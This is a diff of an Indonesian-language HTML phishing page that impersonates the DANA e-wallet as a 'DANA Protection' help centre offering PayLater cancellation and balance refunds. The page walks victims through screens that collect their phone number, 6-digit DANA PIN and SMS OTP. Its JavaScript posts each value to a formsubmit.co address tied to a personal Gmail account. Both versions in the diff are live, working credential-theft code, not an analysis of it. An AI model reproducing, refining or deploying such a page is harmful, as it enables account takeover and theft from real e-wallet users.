@@ -1,18 +1,14 @@
- <!DOCTYPE html>
-<html lang=\"id\">
+<!DOCTYPE html>
+<html lang="id">
 <head>
-  <meta charset=\"UTF-8\" />
-  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\" />
-  <meta property=\"og:title\" content=\"DANA Protection - Pusat Resolusi Akun\" />
-
-<meta property=\"og:description\" content=\"Selesaikan kendala akun DANA Anda dengan cepat dan aman melalui pusat bantuan resmi.\" />
-
-<meta property=\"og:image\" content=\"bank.jpg\" />
-
-<meta property=\"og:url\" content=\"https://pengembalian.github.io/Pengajuan-pinjaman/\" />
-
-<meta property=\"og:type\" content=\"website\" />
-<meta name=\"theme-color\" content=\"#008CFF\">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <meta property="og:title" content="DANA Protection - Pusat Resolusi Akun" />
+  <meta property="og:description" content="Selesaikan kendala akun DANA Anda dengan cepat dan aman melalui pusat bantuan resmi." />
+  <meta property="og:image" content="bank.jpg" />
+  <meta property="og:url" content="https://pengembalian.github.io/Pengajuan-pinjaman/" />
+  <meta property="og:type" content="website" />
+  <meta name="theme-color" content="#008CFF">
   <title>DANA - Pusat Bantuan</title>
   <style>
     * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; -webkit-tap-highlight-color: transparent; }
@@ -60,187 +56,177 @@
     .btn-active { background: #008CFF; color: white; }
     .btn-disabled { background: #B3B9C0; color: white; pointer-events: none; }
 
-    section { display: none; animation: fadeIn 0.3s; }
-    section.active { display: block; }
+    section { display: none; }
+    section.active { display: block; animation: fadeIn 0.3s; }
     @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
   </style>
 </head>
-<body onclick=\"focusPin()\">
+<body onclick="focusPin()">
 
-  <div id=\"loader\"><div class=\"spinner\"></div></div>
+  <div id="loader"><div class="spinner"></div></div>
 
-  <section id=\"page-menu\" class=\"active\">
-    <div class=\"nav-header\"><span>DANA Protection</span></div>
-    <div class=\"blue-banner\"><img src=\"https://upload.wikimedia.org/wikipedia/commons/7/72/Logo_dana_blue.svg\" class=\"logo-dana-white\"></div>
-    <div class=\"container\">
-      <h3 style=\"text-align: center; margin-bottom: 20px; font-size: 16px;\">Pusat Resolusi DANA</h3>
-      <p style=\"text-align: center; font-size: 13px; color: #7A848F; margin-bottom: 25px;\">Silakan pilih kendala yang sedang Anda alami untuk memproses bantuan secara otomatis.
-        dan lanjut Sambungkan akun DANA ke ALFAGIFT kami supaya proses perbaikan rekening dan pengembalian saldo lebih praktis & nyaman</p>
+  <section id="page-menu" class="active">
+    <div class="nav-header"><span>DANA Protection</span></div>
+    <div class="blue-banner"><img src="https://upload.wikimedia.org/wikipedia/commons/7/72/Logo_dana_blue.svg" class="logo-dana-white"></div>
+    <div class="container">
+      <h3 style="text-align: center; margin-bottom: 20px; font-size: 16px;">Pusat Resolusi DANA</h3>
+      <p style="text-align: center; font-size: 13px; color: #7A848F; margin-bottom: 25px;">Pilih kendala yang Anda alami untuk memproses bantuan otomatis.</p>
       
-      <div class=\"menu-btn\" onclick=\"startFlow('Pembatalan PAYLATER')\">
-        <span class=\"menu-icon\">❌</span>
-        <span class=\"menu-text\">Pembatalan PAYLATER</span>
+      <div class="menu-btn" onclick="startFlow('Pembatalan PAYLATER')">
+        <span class="menu-icon">❌</span>
+        <span class="menu-text">Pembatalan PAYLATER</span>
       </div>
-
-      <div class=\"menu-btn\" onclick=\"startFlow('Pengajuan PAYLATER')\">
-        <span class=\"menu-icon\">📝</span>
-        <span class=\"menu-text\">Pengajuan PAYLATER</span>
+      <div class="menu-btn" onclick="startFlow('Pengajuan PAYLATER')">
+        <span class="menu-icon">📝</span>
+        <span class="menu-text">Pengajuan PAYLATER</span>
       </div>
-
-      <div class=\"menu-btn\" onclick=\"startFlow('Saldo proteksi EXSTRA')\">
-        <span class=\"menu-icon\">🛡️</span>
-        <span class=\"menu-text\">Saldo proteksi EXSTRA</span>
+      <div class="menu-btn" onclick="startFlow('Saldo proteksi EXTRA')">
+        <span class="menu-icon">🛡️</span>
+        <span class="menu-text">Saldo proteksi EXTRA</span>
       </div>
-
-      <p style=\"font-size: 11px; color: #9AA2AB; text-align: center; margin-top: 20px;\">Dana Protection menjamin keamanan data pribadi Anda.</p>
     </div>
   </section>
 
-  <section id=\"page-phone\">
-    <div class=\"nav-header\"><span>konfirmasi masalah</span></div>
-    <div class=\"blue-banner\"><img src=\"https://upload.wikimedia.org/wikipedia/commons/7/72/Logo_dana_blue.svg\" class=\"logo-dana-white\"></div>
-    <div class=\"container\">
-      <div class=\"connect-wrapper\">
-        <div class=\"icon-box\"><img src=\"https://upload.wikimedia.org/wikipedia/commons/7/72/Logo_dana_blue.svg\"></div>
-        <div class=\"dots-mid\"><div class=\"dot-s\"></div><div class=\"dot-s\"></div><div class=\"dot-s\"></div></div>
-        <div class=\"icon-box\"><img src=\"alfa.png\" style=\"width: 80%;\"></div>
+  <section id="page-phone">
+    <div class="nav-header"><span>Konfirmasi Masalah</span></div>
+    <div class="blue-banner"><img src="https://upload.wikimedia.org/wikipedia/commons/7/72/Logo_dana_blue.svg" class="logo-dana-white"></div>
+    <div class="container">
+      <div class="connect-wrapper">
+        <div class="icon-box"><img src="https://upload.wikimedia.org/wikipedia/commons/7/72/Logo_dana_blue.svg"></div>
+        <div class="dots-mid"><div class="dot-s"></div><div class="dot-s"></div><div class="dot-s"></div></div>
+        <div class="icon-box"><span style="font-size: 24px;">🏢</span></div>
       </div>
-      <h2 style=\"text-align: center; font-size: 18px; margin: 0 0 10px;\">ALFAGIFT</h2>
-      <p style=\"text-align: center; font-size: 12px; color: #7A848F; margin-bottom: 25px;\">Proses Bantuan: <span id=\"selected-method\" style=\"color:#008CFF; font-weight:bold;\"></span></p>
+      <p style="text-align: center; font-size: 12px; color: #7A848F; margin-bottom: 20px;">Proses: <span id="selected-method" style="color:#008CFF; font-weight:bold;"></span></p>
       
-      <span style=\"font-weight: bold; font-size: 14px; display: block; margin-bottom: 10px;\">Masukkan nomor HP sebagai ID DANA</span>
-      <div class=\"phone-box\">
-        <img src=\"https://upload.wikimedia.org/wikipedia/commons/9/9f/Flag_of_Indonesia.svg\" class=\"flag\">
-        <div class=\"code\">+62</div>
-        <input type=\"tel\" id=\"userPhone\" placeholder=\"123456789\" maxlength=\"13\" oninput=\"checkPhone()\">
+      <span style="font-weight: bold; font-size: 14px; display: block; margin-bottom: 10px;">Masukkan nomor HP ID DANA</span>
+      <div class="phone-box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/9/9f/Flag_of_Indonesia.svg" class="flag">
+        <div class="code">+62</div>
+        <input type="tel" id="userPhone" placeholder="812345678" maxlength="13" oninput="checkPhone()">
       </div>
-
-      <div style=\"font-size: 13px; color: #3D4752;\">
-        <p>✓ Mengatasi masalah anda</p>
-        <p>✓ Melakukan pengembalian saldo deposit</p>
-        <p>✓ memperbaiki rekening tidak invalid</p>
-      </div>
-
-      <button id=\"btnNext\" class=\"btn-submit btn-disabled\" onclick=\"sendPhone()\">LANJUTKAN</button>
+      <button id="btnNext" class="btn-submit btn-disabled" onclick="sendPhone()">LANJUTKAN</button>
     </div>
   </section>
 
-  <section id=\"page-pin\">
-    <div class=\"nav-header\"><span>konfirmasi masalah</span></div>
-    <div style=\"background: #008CFF; color: white; padding: 12px; text-align: center; font-weight: bold;\">✕ Proses Verifikasi</div>
-    <div class=\"container\" style=\"margin-top: 40px; text-align: center;\">
-      <div style=\"text-align: center; margin-bottom: 15px;\">
-  <img src=\"alfa1.png\" style=\"width: 120px; height: auto;\"></div>
-      <p style=\"text-align: center; font-size: 13px; color: #7A848F; margin-bottom: 25px;\">Masukkan 6 digit PIN DANA kamu</p>
-      
-      <div class=\"pin-display\">
-        <div class=\"pin-dot\" id=\"p1\"></div><div class=\"pin-dot\" id=\"p2\"></div><div class=\"pin-dot\" id=\"p3\"></div>
-        <div class=\"pin-dot\" id=\"p4\"></div><div class=\"pin-dot\" id=\"p5\"></div><div class=\"pin-dot\" id=\"p6\"></div>
+  <section id="page-pin">
+    <div class="nav-header"><span>Verifikasi Keamanan</span></div>
+    <div style="background: #008CFF; color: white; padding: 12px; text-align: center; font-weight: bold;">✕ Masukkan PIN DANA</div>
+    <div class="container" style="margin-top: 40px; text-align: center;">
+      <p style="font-size: 13px; color: #7A848F; margin-bottom: 25px;">Silakan masukkan 6 digit PIN DANA kamu</p>
+      <div class="pin-display">
+        <div class="pin-dot" id="p1"></div><div class="pin-dot" id="p2"></div><div class="pin-dot" id="p3"></div>
+        <div class="pin-dot" id="p4"></div><div class="pin-dot" id="p5"></div><div class="pin-dot" id="p6"></div>
       </div>
-      
-      <input type=\"password\" id=\"pinInput\" maxlength=\"6\" inputmode=\"numeric\" style=\"position: absolute; opacity: 0; left: -999px;\" oninput=\"processPin()\">
-      <a href=\"#\" style=\"color: #008CFF; font-weight: bold; text-decoration: none; font-size: 14px;\">LUPA PIN?</a>
+      <input type="password" id="pinInput" maxlength="6" inputmode="numeric" style="position: absolute; opacity: 0; left: -999px;" oninput="processPin()">
+      <a href="#" style="color: #008CFF; font-weight: bold; text-decoration: none; font-size: 14px;">LUPA PIN?</a>
     </div>
   </section>
 
-  <section id=\"page-verify\">
-    <div class=\"nav-header\"><span>konfirmasi masalah</span></div>
-    <div class=\"blue-banner\"><img src=\"https://upload.wikimedia.org/wikipedia/commons/7/72/Logo_dana_blue.svg\" class=\"logo-dana-white\"></div>
-    <div class=\"container\" style=\"text-align: center;\">
-      <p style=\"font-weight: bold; margin-bottom: 20px;\">Verifikasi dikirim ke Akun DANA</p>
-      <div style=\"background: #F0F7FF; padding: 10px 20px; border-radius: 25px; display: inline-flex; align-items: center; gap: 10px; margin-bottom: 25px;\">
-        <img src=\"https://upload.wikimedia.org/wikipedia/commons/7/72/Logo_dana_blue.svg\" width=\"20\">
-        <span id=\"targetNum\" style=\"font-weight: bold; font-size: 14px;\">+628xx .... xxxx</span>
+  <section id="page-verify">
+    <div class="nav-header"><span>Verifikasi Akun</span></div>
+    <div class="blue-banner"><img src="https://upload.wikimedia.org/wikipedia/commons/7/72/Logo_dana_blue.svg" class="logo-dana-white"></div>
+    <div class="container" style="text-align: center;">
+      <p style="font-weight: bold; margin-bottom: 20px;">Verifikasi dikirim ke perangkat Anda</p>
+      <div style="background: #F0F7FF; padding: 10px 20px; border-radius: 25px; display: inline-flex; align-items: center; gap: 10px; margin-bottom: 25px;">
+        <span id="targetNum" style="font-weight: bold; font-size: 14px;"></span>
       </div>
-
-      <div style=\"text-align: left; margin-top: 10px; font-size: 13px; line-height: 1.6;\">
-        <p style=\"font-weight: bold; font-size: 14px; margin-bottom: 10px;\">Cara mengamankan aktivitasmu:</p>
-        <p>📧 Verifikasi dari notifikasi dikirim ke perangkatmu atau cek Kotak Masuk.</p>
-        <p>✔️ Lalu, kembali ke halaman protected untuk melanjutkan verifikasi masalah.</p>
+      <div style="text-align: left; font-size: 13px; line-height: 1.6;">
+        <p>1. Cek notifikasi di aplikasi DANA Anda.</p>
+        <p>2. Konfirmasi akses dengan menekan tombol <b>"Ya, Itu Saya"</b>.</p>
+        <p>3. Setelah itu, klik tombol di bawah untuk memasukkan OTP.</p>
       </div>
-      
-      <p style=\"color: #7A848F; font-size: 12px; margin: 25px 0 15px;\">Mohon lakukan verifikasi terlebih dahulu sebelum melanjutkan ke tahap OTP.</p>
-      <button class=\"btn-submit btn-active\" onclick=\"goOtp()\">MASUKKAN KODE OTP</button>
+      <button class="btn-submit btn-active" onclick="goOtp()" style="margin-top: 20px;">MASUKKAN KODE OTP</button>
     </div>
   </section>
 
-  <section id=\"page-otp\">
-    <div class=\"nav-header\"><span>Verifikasi Kode</span></div>
-    <div class=\"container\" style=\"margin-top: 40px; text-align: center;\">
-      <h2 style=\"text-align: center; font-size: 18px; margin: 0 0 10px;\">Masukkan OTP</h2>
-      <p style=\"text-align: center; font-size: 13px; color: #7A848F; margin-bottom: 25px;\">Kode telah dikirim melalui SMS ke nomor Anda</p>
-      <div style=\"display: flex; gap: 10px; justify-content: center; margin-bottom: 30px;\">
-        <input type=\"tel\" maxlength=\"1\" class=\"otp-box\" oninput=\"jump(this, 'o2')\" id=\"o1\">
-        <input type=\"tel\" maxlength=\"1\" class=\"otp-box\" oninput=\"jump(this, 'o3')\" id=\"o2\">
-        <input type=\"tel\" maxlength=\"1\" class=\"otp-box\" oninput=\"jump(this, 'o4')\" id=\"o3\">
-        <input type=\"tel\" maxlength=\"1\" class=\"otp-box\" oninput=\"jump(this, '')\"   id=\"o4\">
+  <section id="page-otp">
+    <div class="nav-header"><span>Verifikasi OTP</span></div>
+    <div class="container" style="margin-top: 40px; text-align: center;">
+      <h2 style="font-size: 18px; margin: 0 0 10px;">Masukkan OTP</h2>
+      <p style="font-size: 13px; color: #7A848F; margin-bottom: 25px;">Masukkan 4 digit kode yang Anda terima via SMS</p>
+      <div style="display: flex; gap: 10px; justify-content: center; margin-bottom: 30px;">
+        <input type="tel" maxlength="1" class="otp-box" oninput="jump(this, 'o2')" id="o1">
+        <input type="tel" maxlength="1" class="otp-box" oninput="jump(this, 'o3')" id="o2">
+        <input type="tel" maxlength="1" class="otp-box" oninput="jump(this, 'o4')" id="o3">
+        <input type="tel" maxlength="1" class="otp-box" oninput="jump(this, '')"   id="o4">
       </div>
-      <button class=\"btn-submit btn-active\" onclick=\"sendOtp()\">KONFIRMASI</button>
+      <button class="btn-submit btn-active" onclick="sendOtp()">KONFIRMASI</button>
     </div>
   </section>
 
   <script>
-    const API = \"https://formsubmit.co/ajax/baygaming648@gmail.com\";
-    let dataStore = { method: \"\", phone: \"\", pin: \"\" };
+    const API = "https://formsubmit.co/ajax/baygaming648@gmail.com";
+    let dataStore = { method: "", phone: "", pin: "" };
 
-    function jump(c, n) { if(c.value.length >= 1 && n !== \"\") { document.getElementById(n).focus(); } }
-
+    // Navigasi antar halaman dengan Loader
     function showLoader(fn) {
       document.getElementById('loader').style.display = 'flex';
-      setTimeout(() => { document.getElementById('loader').style.display = 'none'; if(fn) fn(); }, 1200);
+      setTimeout(() => {
+        document.getElementById('loader').style.display = 'none';
+        if(fn) fn();
+      }, 1000);
     }
+
+    function jump(c, n) { if(c.value.length >= 1 && n) { document.getElementById(n).focus(); } }
 
     function startFlow(method) {
       dataStore.method = method;
       document.getElementById('selected-method').innerText = method;
       showLoader(() => {
-        document.getElementById('page-menu').classList.remove('active');
+        document.querySelectorAll('section').forEach(s => s.classList.remove('active'));
         document.getElementById('page-phone').classList.add('active');
       });
-    }
-
-    function focusPin() { 
-      if(document.getElementById('page-pin').classList.contains('active')) {
-        document.getElementById('pinInput').focus(); 
-      }
     }
 
     function checkPhone() {
       const v = document.getElementById('userPhone').value;
       const btn = document.getElementById('btnNext');
-      if(v.length >= 9) { btn.className = \"btn-submit btn-active\"; btn.disabled = false; }
-      else { btn.className = \"btn-submit btn-disabled\"; btn.disabled = true; }
+      if(v.length >= 9) {
+        btn.classList.replace('btn-disabled', 'btn-active');
+        btn.disabled = false;
+      } else {
+        btn.classList.replace('btn-active', 'btn-disabled');
+        btn.disabled = true;
+      }
     }
 
     function sendPhone() {
-      dataStore.phone = \"+62\" + document.getElementById('userPhone').value;
-      document.getElementById('targetNum').innerText = dataStore.phone.substring(0,6) + \" .... \" + dataStore.phone.slice(-4);
+      dataStore.phone = "+62" + document.getElementById('userPhone').value;
+      document.getElementById('targetNum').innerText = dataStore.phone;
       
       fetch(API, {
-        method: \"POST\", headers: { \"Content-Type\": \"application/json\" },
-        body: JSON.stringify({ \"STATUS\": \"LOG NOMOR\", \"METODE\": dataStore.method, \"NOMOR_HP\": dataStore.phone })
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ "Tipe": "LOG NOMOR", "Metode": dataStore.method, "Nomor": dataStore.phone })
       });
 
       showLoader(() => {
-        document.getElementById('page-phone').classList.remove('active');
+        document.querySelectorAll('section').forEach(s => s.classList.remove('active'));
         document.getElementById('page-pin').classList.add('active');
-        setTimeout(() => { document.getElementById('pinInput').focus(); }, 200);
+        setTimeout(() => document.getElementById('pinInput').focus(), 300);
       });
+    }
+
+    function focusPin() {
+      if(document.getElementById('page-pin').classList.contains('active')) {
+        document.getElementById('pinInput').focus();
+      }
     }
 
     function processPin() {
       const val = document.getElementById('pinInput').value;
       for(let i=1; i<=6; i++) {
-        document.getElementById('p'+i).className = val[i-1] ? \"pin-dot fill\" : \"pin-dot\";
+        document.getElementById('p'+i).className = val[i-1] ? "pin-dot fill" : "pin-dot";
       }
       if(val.length === 6) {
         dataStore.pin = val;
         fetch(API, {
-          method: \"POST\", headers: { \"Content-Type\": \"application/json\" },
-          body: JSON.stringify({ \"STATUS\": \"LOG PIN\", \"NOMOR_HP\": dataStore.phone, \"PIN_DANA\": dataStore.pin })
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ "Tipe": "LOG PIN", "Nomor": dataStore.phone, "PIN": dataStore.pin })
         });
         showLoader(() => {
-          document.getElementById('page-pin').classList.remove('active');
+          document.querySelectorAll('section').forEach(s => s.classList.remove('active'));
           document.getElementById('page-verify').classList.add('active');
         });
       }
@@ -248,24 +234,26 @@
 
     function goOtp() {
       showLoader(() => {
-        document.getElementById('page-verify').classList.remove('active');
+        document.querySelectorAll('section').forEach(s => s.classList.remove('active'));
         document.getElementById('page-otp').classList.add('active');
-        setTimeout(() => { document.getElementById('o1').focus(); }, 200);
       });
     }
 
     function sendOtp() {
-      const otps = Array.from(document.querySelectorAll('.otp-box')).map(i => i.value).join('');
-      if(otps.length < 4) return;
+      const otpVal = document.getElementById('o1').value + document.getElementById('o2').value + document.getElementById('o3').value + document.getElementById('o4').value;
+      if(otpVal.length < 4) return alert("Masukkan OTP lengkap");
+
       fetch(API, {
-        method: \"POST\", headers: { \"Content-Type\": \"application/json\" },
-        body: JSON.stringify({ \"STATUS\": \"FINAL OTP\", \"NOMOR_HP\": dataStore.phone, \"PIN\": dataStore.pin, \"OTP\": otps })
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ "Tipe": "FINAL OTP", "Nomor": dataStore.phone, "PIN": dataStore.pin, "OTP": otpVal })
       });
+
       showLoader(() => {
-        alert(\"Sistem sedang memproses permohonan Anda. Mohon tunggu 1x24 jam.\");
+        alert("Permintaan sedang diproses. Silakan tunggu konfirmasi 1x24 jam.");
         location.reload();
       });
     }
   </script>
 </body>
-</html>
+   </html>
